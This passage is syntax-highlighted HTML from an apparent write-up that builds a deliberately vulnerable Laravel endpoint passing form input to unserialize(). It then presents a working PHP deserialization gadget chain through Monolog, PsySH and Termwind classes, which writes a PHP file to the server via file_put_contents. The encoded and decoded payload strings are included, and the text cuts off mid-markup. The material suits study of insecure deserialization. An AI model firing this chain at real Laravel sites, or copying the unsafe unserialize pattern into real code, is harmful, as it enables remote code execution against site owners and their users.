+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            $data <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>(<span style="color:#a6e22e">urldecode</span>($serializedData));
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//            dd($data);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ($data <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">response</span>()<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">json</span>([
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#39;success&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#39;data&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;Successfully&#34;</span>
+</span></span><span style="display:flex;"><span>                ]);
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\Exception</span>(<span style="color:#e6db74">&#39;Unable to unserialize data&#39;</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">\Exception</span> $e) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">response</span>()<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">json</span>([
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;success&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;message&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;Error unserializing data&#39;</span>
+</span></span><span style="display:flex;"><span>            ], <span style="color:#ae81ff">400</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>resources/views/welcom.blade.php</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;!</span><span style="color:#a6e22e">DOCTYPE</span> <span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">head</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">title</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Document</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">title</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">head</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">body</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{{url(&#39;unserialize-data&#39;)}}&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>	 <span style="color:#f92672">@</span><span style="color:#a6e22e">csrf</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;serialized_data&#34;</span> <span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">form</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">body</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p><code>routes/web.php</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> <span style="color:#a6e22e">Illuminate\Support\Facades\Route</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Route</span><span style="color:#f92672">::</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#66d9ef">function</span> () {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">view</span>(<span style="color:#e6db74">&#39;welcome&#39;</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Route</span><span style="color:#f92672">::</span><span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/unserialize-data&#39;</span>, [<span style="color:#a6e22e">App\Http\Controllers\UnserializeController</span><span style="color:#f92672">::</span><span style="color:#a6e22e">class</span>, <span style="color:#e6db74">&#39;unserializeData&#39;</span>]);
+</span></span></code></pre></div><p><strong>Exploit</strong></p>
+<p>Pop-chain:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">Monolog\Handler</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">GroupHandler</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">array</span> $handlers;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($oa){
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">handlers</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span>$oa;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">Psy\Readline\Hoa</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FileRead</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> $_bucket <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($oa){
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_bucket</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span>$oa;
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_bucket</span>[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">=</span>$oa;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">Termwind\Components</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> <span style="color:#a6e22e">Termwind\ValueObjects\Styles</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Hr</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">Element</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($oa){
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">styles</span> <span style="color:#f92672">=</span> $oa;
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">content</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abc.php&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">abstract</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Element</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">array</span> $defaultStyles <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> <span style="color:#a6e22e">Styles</span> $styles;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">array</span><span style="color:#f92672">|</span><span style="color:#a6e22e">string</span> $content;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">Termwind\ValueObjects</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Styles</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">array</span> $textModifiers <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;file_put_contents&#39;</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">array</span> $properties <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;styles&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;parentStyles&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>        ];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span>{
+</span></span><span style="display:flex;"><span>    $styles <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Termwind\ValueObjects\Styles</span>;
+</span></span><span style="display:flex;"><span>    $hr <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Termwind\Components\Hr</span>($styles);
+</span></span><span style="display:flex;"><span>    $o2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Psy\Readline\Hoa\FileRead</span>($hr);
+</span></span><span style="display:flex;"><span>    $o3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Monolog\Handler\GroupHandler</span>($o2);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>($o3));
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">O</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A28</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">Monolog</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CHandler</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CGroupHandler</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A11</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#a6e22e">handlers</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Ba</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bi</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A0</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A25</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">Psy</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CReadline</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CHoa</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CFileRead</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A10</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#a6e22e">_bucket</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Ba</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A2</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bi</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A0</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">Termwind</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CComponents</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CHr</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A2</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A9</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#a6e22e">styles</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A28</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">Termwind</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CValueObjects</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CStyles</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A2</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A43</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#a6e22e">Termwind</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CValueObjects</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CStyles</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#a6e22e">textModifiers</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Ba</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bi</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A0</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A17</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">file_put_contents</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">B</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Ds</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A40</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#a6e22e">Termwind</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CValueObjects</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CStyles</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#a6e22e">properties</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Ba</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A2</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A6</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">styles</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A19</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">C</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Fphp</span><span style="color:#f92672">+</span><span style="color:#a6e22e">phpinfo</span><span style="color:#f92672">%</span><span style="color:#ae81ff">28</span><span style="color:#f92672">%</span><span style="color:#ae81ff">29</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">B</span><span style="color:#f92672">+%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">F</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">E</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A12</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">parentStyles</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Bi</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A0</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">B</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Ds</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A10</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#a6e22e">content</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A7</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">abc</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">B</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Di</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A2</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Br</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A5</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">B</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">decode</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">28</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;Monolog\Handler\GroupHandler&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">11</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;*handlers&#34;</span>;<span style="color:#a6e22e">a</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">i</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">25</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;Psy</span><span style="color:#ae81ff">\R</span><span style="color:#e6db74">eadline\Hoa\FileRead&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">10</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;*_bucket&#34;</span>;<span style="color:#a6e22e">a</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">i</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">22</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;Termwind\Components\Hr&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">9</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;*styles&#34;</span>;<span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">28</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;Termwind\ValueObjects\Styles&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">43</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;Termwind\ValueObjects\StylestextModifiers&#34;</span>;<span style="color:#a6e22e">a</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">i</span><span 